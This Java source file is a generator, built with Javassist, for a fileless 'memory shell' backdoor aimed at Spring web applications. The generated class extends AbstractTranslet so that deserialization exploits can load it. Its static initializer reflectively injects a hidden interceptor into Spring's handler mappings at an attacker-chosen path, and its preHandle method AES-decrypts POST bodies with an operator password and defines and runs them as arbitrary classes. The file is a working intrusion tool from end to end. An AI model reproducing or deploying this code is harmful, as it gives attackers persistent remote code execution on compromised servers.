package com.mechoy.memshell.spring;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class SpringInterceptorBehinder {
    public static byte[] generateListenerMemShell(String path, String pass) throws CannotCompileException, NotFoundException, IOException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);

        CtClass abstractTransletClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass handlerInterceptorClass = pool.get("org.springframework.web.servlet.HandlerInterceptor");

        // 继承父类
        ctClass.setSuperclass(abstractTransletClass);

        // 实现接口
        ctClass.setInterfaces(new CtClass[]{handlerInterceptorClass});

        // 创建默认构造器
        CtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);
        ctClass.addConstructor(ctConstructor);

        // 创建transform方法
        CtMethod transform = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform);

        // 创建transform方法
        CtMethod transform1 = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform1);

        // 创建preHandle方法
        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(javax.servlet.http.HttpServletRequest req1, javax.servlet.http.HttpServletResponse resp, java.lang.Object var3) throws Exception {\n" +
                "        javax.servlet.http.HttpServletRequest request = req1;\n" +
                "        if (req1.getClass().getName().contains(\"Servlet3SecurityContextHolderAwareRequestWrapper\")) {\n" +
                "            org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestWrapper securityContextHolderAwareRequestWrapper = (org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestWrapper) req1;\n" +
                "            javax.servlet.http.HttpServletRequestWrapper httpServletRequestWrapper = (javax.servlet.http.HttpServletRequestWrapper) securityContextHolderAwareRequestWrapper.getRequest();\n" +
                "            javax.servlet.http.HttpServletRequestWrapper httpServletRequestWrapper1 = (javax.servlet.http.HttpServletRequestWrapper) httpServletRequestWrapper.getRequest();\n" +
                "            request = (javax.servlet.http.HttpServletRequest) httpServletRequestWrapper1.getRequest();\n" +
                "        }\n" +
                "        if (req1.getClass().getName().contains(\"ShiroHttpServletRequest\")) {\n" +
                "            request = (javax.servlet.http.HttpServletRequest) ((javax.servlet.http.HttpServletRequestWrapper) req1).getRequest();\n" +
                "        }\n" +
                "\n" +
                "        if (request.getMethod().equals(\"POST\")) {\n" +
                "            java.lang.reflect.Field var4 = ((org.apache.catalina.connector.RequestFacade) request).getClass().getDeclaredField(\"request\");\n" +
                "            var4.setAccessible(true);\n" +
                "            org.apache.catalina.connector.Request var5 = (org.apache.catalina.connector.Request) var4.get(request);\n" +
                "            org.apache.catalina.connector.Response var6 = var5.getResponse();\n" +
                "            javax.servlet.http.HttpSession var7 = var5.getSession();\n" +
                "            java.util.HashMap var8 = new java.util.HashMap();\n" +
                "            var8.put(\"request\", var5);\n" +
                "            var8.put(\"response\", var6);\n" +
                "            var8.put(\"session\", var7);\n" +
                "            java.lang.String var9 = \"" + pass + "\";\n" +
                "            var7.putValue(\"u\", var9);\n" +
                "            javax.crypto.Cipher var10 = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "            var10.init(2, new javax.crypto.spec.SecretKeySpec(var9.getBytes(), \"AES\"));\n" +
                "            java.lang.ClassLoader var11 = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "            java.lang.Class var12 = java.lang.Class.forName(\"java.lang.ClassLoader\");\n" +
                "            java.lang.reflect.Method var13 = var12.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, Integer.TYPE, Integer.TYPE});\n" +
                "            var13.setAccessible(true);\n" +
                "            byte[] var14 = var10.doFinal((new sun.misc.BASE64Decoder()).decodeBuffer(var5.getReader().readLine()));\n" +
                "            Class var15 = (Class) var13.invoke(var11, new Object[]{null, var14, Integer.valueOf(0), Integer.valueOf(var14.length)});\n" +
                "            var15.newInstance().equals(var8);\n" +
                "            return false;\n" +
                "        } else {\n" +
                "            return true;\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(preHandle);

//        ctClass.makeClassInitializer().insertBefore("try {\n" +
//                "   org.springframework.web.context.WebApplicationContext webApplicationContext = (org.springframework.web.context.WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
//                "   org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"requestMappingHandlerMapping\");\n" +
//                "   java.lang.reflect.Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
//                "   adaptedInterceptorsField.setAccessible(true);\n" +
//                "   java.util.List adaptedInterceptors =  adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
//                "   adaptedInterceptors.add(0,new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"},null,new " + className + "()));\n" +
//                "   adaptedInterceptorsField.set(abstractHandlerMapping,adaptedInterceptors);\n" +
//                "   org.springframework.web.servlet.handler.AbstractHandlerMapping simpleUrlHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"resourceHandlerMapping\");\n" +
//                "   java.util.List adaptedInterceptors1 =  adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
//                "   adaptedInterceptors1.add(0,new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"},null,new " + className + "()));\n" +
//                "   adaptedInterceptorsField.set(simpleUrlHandlerMapping,adaptedInterceptors1);" +
//                "} catch (Exception e) {\n" +
//                "   e.printStackTrace();\n" +
//                "}");

        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "   java.lang.reflect.Field applicationContextsField = Class.forName(\"org.springframework.context.support.LiveBeansView\").getDeclaredField(\"applicationContexts\");\n" +
                "   applicationContextsField.setAccessible(true);\n" +
                "   java.util.LinkedHashSet hashSet = (java.util.LinkedHashSet) applicationContextsField.get(null);\n" +
                "   org.springframework.web.context.WebApplicationContext webApplicationContext;\n" +
                "   java.util.Iterator iterator = hashSet.iterator();\n" +
                "   while (iterator.hasNext()) {\n" +
                "       org.springframework.context.ConfigurableApplicationContext configurableApplicationContext = iterator.next();" +
                "       if (configurableApplicationContext instanceof org.springframework.web.context.WebApplicationContext) {\n" +
                "           webApplicationContext = (org.springframework.web.context.WebApplicationContext) configurableApplicationContext;\n" +
                "           org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"requestMappingHandlerMapping\");\n" +
                "           java.lang.reflect.Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "           adaptedInterceptorsField.setAccessible(true);\n" +
                "           java.util.List adaptedInterceptors = (java.util.List) adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
                "           adaptedInterceptors.add(0, new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"}, null, new " + className + "()));\n" +
                "           adaptedInterceptorsField.set(abstractHandlerMapping, adaptedInterceptors);\n" +
                "           java.lang.Object resourceHandlerMapping = webApplicationContext.getBean(\"resourceHandlerMapping\");\n" +
                "           if (!resourceHandlerMapping.toString().equals(\"null\")) {" +
                "               org.springframework.web.servlet.handler.AbstractHandlerMapping simpleUrlHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) resourceHandlerMapping;\n" +
                "               java.util.List o = (java.util.List) adaptedInterceptorsField.get(simpleUrlHandlerMapping);\n" +
                "               o.add(0, new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"}, null, new " + className + "()));\n" +
                "           }\n" +
                "       }\n" +
                "   }\n" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}");

        return ctClass.toBytecode();
    }
}
